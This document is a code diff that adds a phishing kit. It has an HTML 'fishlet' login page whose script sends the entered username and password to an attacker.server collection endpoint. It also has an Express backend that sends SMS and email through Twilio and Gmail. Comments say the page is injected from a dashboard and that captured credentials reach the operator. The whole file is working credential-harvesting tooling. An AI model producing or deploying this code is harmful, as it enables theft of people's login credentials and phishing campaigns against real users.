@@ -1,0 +1,72 @@
+// Example: Fishlet Template (HTML Phishing Page for Login)
+const fishletExample = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    body { background: #111; color: #eee; font-family: sans-serif; text-align: center; margin-top: 50px; }
+    input { margin: 10px; padding: 8px; border-radius: 4px; border: 1px solid #666; }
+    button { padding: 10px 20px; border: none; background: #28a745; color: #fff; border-radius: 4px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h2>Secure Login</h2>
+  <form id="loginForm">
+    <input type="text" placeholder="Username" name="username"><br>
+    <input type="password" placeholder="Password" name="password"><br>
+    <button type="submit">Login</button>
+  </form>
+  <script>
+    document.getElementById('loginForm').onsubmit = async function(e) {
+      e.preventDefault();
+      const formData = new FormData(e.target);
+      const payload = Object.fromEntries(formData.entries());
+      await fetch('https://attacker.server/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      alert('Verifying...');
+    };
+  </script>
+</body>
+</html>
+`;
+
+// Message Sending Example (Backend Endpoint)
+const express = require('express');
+const nodemailer = require('nodemailer');
+const twilio = require('twilio');
+const app = express();
+app.use(express.json());
+
+// Twilio Setup
+const smsClient = twilio('TWILIO_SID', 'TWILIO_AUTH');
+
+// Email Setup
+const mailTransport = nodemailer.createTransport({
+  service: 'gmail',
+  auth: { user: 'you@gmail.com', pass: 'password' }
+});
+
+app.post('/send', async (req, res) => {
+  const { type, to, message } = req.body;
+  try {
+    if (type === 'sms') {
+      await smsClient.messages.create({ to, from: '+1234567890', body: message });
+    } else if (type === 'email') {
+      await mailTransport.sendMail({ from: 'you@gmail.com', to, subject: 'Phishing Attempt', text: message });
+    }
+    res.send({ status: 'sent' });
+  } catch (err) {
+    res.status(500).send({ error: err.toString() });
+  }
+});
+
+app.listen(8080, () => console.log('Server running on port 8080'));
+
+// The fishletExample variable could be injected from the dashboard or selected by name
+// And the server would receive credentials and optionally message an operator via email or SMS
